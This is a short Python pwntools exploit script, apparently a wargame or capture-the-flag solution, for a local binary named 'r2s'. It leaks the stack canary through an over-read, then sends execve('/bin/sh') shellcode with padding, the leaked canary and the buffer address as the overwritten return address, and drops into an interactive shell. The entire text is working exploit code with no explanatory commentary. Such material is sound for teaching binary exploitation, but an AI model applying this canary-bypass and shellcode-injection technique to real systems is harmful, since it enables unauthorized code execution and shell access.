from pwn import *

p = process('./r2s')
context.arch = "amd64"
p.recvuntil(b"the buf: ")
buf_addr = p.recvuntil(b'\n')
buf_addr = buf_addr[:-1]
buf_addr = int(buf_addr, 16)

leak = b'A'*89
p.sendafter(b"Input: ",  leak)
p.recvuntil(leak)
canary = b''
canary += b"\x00" + p.recv(7)
print(canary)
print(p64(u64(canary)))

payload = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload += b"\x90"*65
payload += canary
payload += b"r"*8
payload += p64(buf_addr)

p.sendlineafter("Input:",payload)
p.interactive()